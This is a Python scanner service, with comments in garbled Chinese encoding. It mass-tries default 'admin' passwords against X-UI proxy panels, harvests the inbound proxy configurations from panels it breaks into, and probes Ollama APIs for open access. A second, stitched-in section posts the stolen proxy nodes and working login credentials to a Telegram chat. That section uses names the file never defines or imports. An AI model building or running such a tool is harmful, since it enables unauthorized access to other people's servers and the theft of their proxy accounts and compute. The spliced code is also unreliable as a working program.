# services/scanner_service.py (ä¿®å¤ä»£ç†æ ¼å¼ç”Ÿæˆ)
import asyncio
import aiohttp
import json
import yaml
import logging
import base64
import urllib.parse
from typing import List, Dict, Any, Callable, Optional, Tuple  # æ·»åŠ Tupleå¯¼å…¥
from config import config
from data_manager import data_manager

logger = logging.getLogger(__name__)

class ScannerService:
    """ç»Ÿä¸€çš„æ‰«ææœåŠ¡ - ä½¿ç”¨å¼‚æ­¥æå‡æ€§èƒ½"""
    
    def __init__(self):
        self.session = None
        self.check_count = config.DEFAULT_CHECK_COUNT
        self.passwords = config.DEFAULT_PASSWORDS.copy()
    
    async def __aenter__(self):
        """å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨å…¥å£"""
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨é€€å‡º"""
        if self.session:
            await self.session.close()
    
    async def scan_xui_batch(self, urls: List[str], 
                           progress_callback: Optional[Callable] = None,
                           cancel_flag: Optional[Dict] = None) -> Dict[str, Any]:
        """æ‰¹é‡æ‰«æXUIé¢æ¿"""
        if len(urls) > self.check_count:
            urls = urls[:self.check_count]
        
        results = {
            'successful_logins': [],
            'new_proxies': [],
            'total_scanned': len(urls),
            'success_count': 0
        }
        
        # ä½¿ç”¨ä¿¡å·é‡é™åˆ¶å¹¶å‘æ•°
        semaphore = asyncio.Semaphore(10)
        
        async def scan_single_url(index: int, url: str) -> Tuple[bool, str]:
            async with semaphore:
                if cancel_flag and cancel_flag.get('cancelled'):
                    return False, "å·²å–æ¶ˆ"
                
                # æ›´æ–°è¿›åº¦
                if progress_callback:
                    await progress_callback(index + 1, len(urls), url)
                
                return await self._scan_xui_single(url, results)
        
        # å¹¶å‘æ‰§è¡Œæ‰«æä»»åŠ¡
        tasks = [scan_single_url(i, url) for i, url in enumerate(urls)]
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # ç»Ÿè®¡æˆåŠŸæ•°é‡
        results['success_count'] = sum(1 for success, _ in scan_results 
                                     if isinstance(success, bool) and success)
        
        return results
    
    async def _scan_xui_single(self, url: str, results: Dict) -> Tuple[bool, str]:
        """æ‰«æå•ä¸ªXUIåœ°å€"""
        try:
            # æ ‡å‡†åŒ–URL
            if not url.startswith(('http://', 'https://')):
                url = f"http://{url}"
            
            if ':' not in url.split('//')[-1]:
                url += ":54321"
            
            # å°è¯•ç™»å½•
            for password in self.passwords:
                login_success, cookie = await self._try_login(url, password)
                if login_success:
                    results['successful_logins'].append(f"{url} admin,{password}")
                    
                    # è·å–ä»£ç†é…ç½®
                    proxies = await self._get_xui_proxies(url, cookie)
                    if proxies:
                        results['new_proxies'].extend(proxies)
                    
                    return True, f"ç™»å½•æˆåŠŸ: {url}"
            
            return False, f"ç™»å½•å¤±è´¥: {url}"
            
        except Exception as e:
            logger.error(f"æ‰«æXUIå¤±è´¥ {url}: {e}")
            return False, f"æ‰«æå¤±è´¥: {str(e)}"
    
    async def _try_login(self, url: str, password: str) -> Tuple[bool, Optional[str]]:
        """å°è¯•ç™»å½•XUIé¢æ¿"""
        login_data = {
            "username": "admin",
            "password": password
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with self.session.post(f'{url}/login', 
                                       data=login_data, 
                                       headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        # ä»å“åº”å¤´è·å–cookie
                        cookie = response.headers.get('Set-Cookie')
                        return True, cookie
                
                return False, None
                
        except Exception as e:
            logger.debug(f"ç™»å½•å¤±è´¥ {url}: {e}")
            return False, None
    
    async def _get_xui_proxies(self, url: str, cookie: str) -> List[Dict[str, Any]]:
        """è·å–XUIä»£ç†é…ç½®"""
        if not cookie:
            return []
        
        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with self.session.post(f'{url}/xui/inbound/list', 
                                       headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        return self._parse_xui_response(result, url)
                
                return []
                
        except Exception as e:
            logger.error(f"è·å–XUIé…ç½®å¤±è´¥ {url}: {e}")
            return []
    
    def _parse_xui_response(self, response: Dict, base_url: str) -> List[Dict[str, Any]]:
        """è§£æXUIå“åº”ï¼Œç”Ÿæˆä»£ç†é…ç½®"""
        proxies = []
        server_ip = base_url.split('://')[1].split(':')[0]
        
        for item in response.get("obj", []):
            if not (item.get("enable") and item.get("expiryTime") == 0):
                continue
            
            protocol = item.get("protocol")
            proxy_config = None
            
            name = f"US| {server_ip}:{item['port']}"
            
            if protocol == "vmess":
                proxy_config = self._create_vmess_config(item, server_ip, name)
            elif protocol == "vless":
                proxy_config = self._create_vless_config(item, server_ip, name)
            elif protocol == "shadowsocks":
                proxy_config = self._create_ss_config(item, server_ip, name)
            elif protocol == "trojan":
                proxy_config = self._create_trojan_config(item, server_ip, name)
            
            if proxy_config:
                # æ£€æŸ¥é‡å¤
                existing_proxies = data_manager.load_proxies()
                if not any(p.get('name') == name for p in existing_proxies):
                    proxies.append(proxy_config)
        
        return proxies
    
    def _create_vmess_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """åˆ›å»ºVMessé…ç½®"""
        settings = json.loads(item.get("settings", "{}"))
        stream_settings = json.loads(item.get("streamSettings", "{}"))
        
        config = {
            'name': name,
            'type': 'vmess',
            'server': server,
            'port': item["port"],
            'uuid': settings.get("clients", [{}])[0].get("id"),
            'alterId': 0,
            'cipher': 'none',
            'network': stream_settings.get("network", 'tcp'),
            'tls': False,
            'udp': False
        }
        
        if config['network'] == "ws":
            config.update({
                'path': stream_settings.get("wsSettings", {}).get("path", "/"),
                'headerType': 'none'
            })
        
        return config
    
    def _create_vless_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """åˆ›å»ºVLessé…ç½®"""
        settings = json.loads(item.get("settings", "{}"))
        stream_settings = json.loads(item.get("streamSettings", "{}"))
        
        return {
            'name': name,
            'type': 'vless',
            'server': server,
            'port': item["port"],
            'uuid': settings.get("clients", [{}])[0].get("id"),
            'network': stream_settings.get("network", 'tcp'),
            'security': 'none'
        }
    
    def _create_ss_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """åˆ›å»ºShadowsocksé…ç½®"""
        settings = json.loads(item.get("settings", "{}"))
        
        return {
            'name': name,
            'type': 'ss',
            'server': server,
            'port': item["port"],
            'cipher': settings.get("method", "aes-256-gcm"),
            'password': settings.get("password", ""),
            'udp': True
        }
    
    def _create_trojan_config(self, item: Dict, server: str, name: str) -> Dict[str, Any]:
        """åˆ›å»ºTrojané…ç½®"""
        settings = json.loads(item.get("settings", "{}"))
        
        return {
            'name': name,
            'type': 'trojan',
            'server': server,
            'port': item["port"],
            'password': settings.get("clients", [{}])[0].get("password", ""),
            'sni': '',
            'udp': True
        }
    
    async def scan_ollama_batch(self, urls: List[str], 
                              progress_callback: Optional[Callable] = None,
                              cancel_flag: Optional[Dict] = None) -> Dict[str, Any]:
        """æ‰¹é‡æ‰«æOllama API"""
        if len(urls) > self.check_count:
            urls = urls[:self.check_count]
        
        results = {
            'successful_urls': [],
            'total_scanned': len(urls),
            'success_count': 0
        }
        
        semaphore = asyncio.Semaphore(20)  # Ollamaæ£€æµ‹å¯ä»¥æ›´é«˜å¹¶å‘
        
        async def scan_single_url(index: int, url: str) -> bool:
            async with semaphore:
                if cancel_flag and cancel_flag.get('cancelled'):
                    return False
                
                if progress_callback:
                    await progress_callback(index + 1, len(urls), url)
                
                success = await self._check_ollama_api(url)
                if success:
                    results['successful_urls'].append(url)
                return success
        
        tasks = [scan_single_url(i, url) for i, url in enumerate(urls)]
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        results['success_count'] = sum(1 for result in scan_results 
                                     if isinstance(result, bool) and result)
        
        return results
    
    async def _check_ollama_api(self, url: str) -> bool:
        """æ£€æŸ¥Ollama APIæ˜¯å¦å¯ç”¨"""
        if not url.startswith(('http://', 'https://')):
            url = f"http://{url}"
        
        try:
            async with self.session.get(f'{url}/v1/models', 
                                      headers={'Authorization': 'Bearer aaa'}) as response:
                return response.status == 200
        except Exception:
            return False
       
# services/scanner_service.py (ä¿®å¤æ‰«æç»“æœè¿½åŠ é€»è¾‘)
# ... å‰é¢çš„ä»£ç ä¿æŒä¸å˜ ...

    async def _send_xui_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
                              results: dict, timestamp: int) -> None:
        """å‘é€XUIæ‰«æç»“æœæ–‡ä»¶ - ä¿®å¤è¿½åŠ é€»è¾‘"""
        new_proxies = results.get('new_proxies', [])
        successful_logins = results.get('successful_logins', [])
        
        # å‘é€ä»£ç†èŠ‚ç‚¹æ–‡ä»¶
        if new_proxies:
            nodes_filename = f"xui_nodes_{timestamp}.txt"
            with open(nodes_filename, "w", encoding='utf-8') as f:
                yaml.dump(new_proxies, f, default_flow_style=False, 
                         allow_unicode=True, sort_keys=False)
            
            with open(nodes_filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=nodes_filename,
                    caption=f"ğŸ“„ XUIæ‰«æèŠ‚ç‚¹ ({len(new_proxies)} ä¸ª)"
                )
            
            # è¿½åŠ åˆ°ä¸»æ–‡ä»¶è€Œä¸æ˜¯è¦†ç›–
            existing_proxies = data_manager.load_proxies()
            # æ£€æŸ¥é‡å¤ï¼Œåªæ·»åŠ ä¸å­˜åœ¨çš„èŠ‚ç‚¹
            existing_names = {proxy.get('name') for proxy in existing_proxies}
            unique_new_proxies = [proxy for proxy in new_proxies 
                                 if proxy.get('name') not in existing_names]
            
            if unique_new_proxies:
                existing_proxies.extend(unique_new_proxies)
                data_manager.save_proxies(existing_proxies)
                
                # å‘é€è¿½åŠ ç»Ÿè®¡ä¿¡æ¯
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"âœ… å·²è¿½åŠ  {len(unique_new_proxies)} ä¸ªæ–°èŠ‚ç‚¹åˆ°all_proxies.txt\n"
                         f"è·³è¿‡ {len(new_proxies) - len(unique_new_proxies)} ä¸ªé‡å¤èŠ‚ç‚¹"
                )
            else:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="â„¹ï¸ æ‰€æœ‰æ‰«æåˆ°çš„èŠ‚ç‚¹éƒ½å·²å­˜åœ¨ï¼Œæœªæ·»åŠ æ–°èŠ‚ç‚¹"
                )
            
            # æ¸…ç†ä¸´æ—¶æ–‡ä»¶
            try:
                os.remove(nodes_filename)
            except:
                pass
        
        # å‘é€ç™»å½•ä¿¡æ¯æ–‡ä»¶
        if successful_logins:
            logins_filename = f"successful_logins_{timestamp}.txt"
            with open(logins_filename, "w", encoding='utf-8') as f:
                f.write("\n".join(successful_logins))
            
            with open(logins_filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename=logins_filename,
                    caption=f"ğŸ”‘ æˆåŠŸç™»å½•ä¿¡æ¯ ({len(successful_logins)} ä¸ª)"
                )
            
            try:
                os.remove(logins_filename)
            except:
                pass
    
    async def handle_document_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """å¤„ç†æ–‡æ¡£ä¸Šä¼ """
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        state = self.user_states.get(chat_id, States.IDLE)
        
        if not self.check_permission(user_id, Permissions.ADMIN):
            await update.message.reply_text("âŒ æƒé™ä¸è¶³")
            return
        
        if state not in [States.SCAN_XUI, States.SCAN_OLLAMA]:
            await update.message.reply_text("âŒ å½“å‰ä¸åœ¨æ‰«æçŠ¶æ€")
            return
        
        try:
            document = update.message.document
            file = await context.bot.get_file(document.file_id)
            file_path = os.path.join(config.UPLOAD_DIR, document.file_name)
            
            await file.download_to_drive(file_path)
            await update.message.reply_text("ğŸ“„ æ–‡ä»¶å·²æ¥æ”¶ï¼Œæ­£åœ¨å¤„ç†...")
            
            # è¯»å–æ–‡ä»¶å†…å®¹
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            urls = [line.strip() for line in lines if line.strip()]
            
            # æ‰§è¡Œæ‰«æ
            scan_type = "xui" if state == States.SCAN_XUI else "ollama"
            await self.handle_scan_urls(update, context, urls, scan_type)
            
            # æ¸…ç†æ–‡ä»¶
            try:
                os.remove(file_path)
            except:
                pass
        
        except Exception as e:
            await update.message.reply_text(f"âŒ å¤„ç†æ–‡ä»¶å¤±è´¥: {str(e)}")


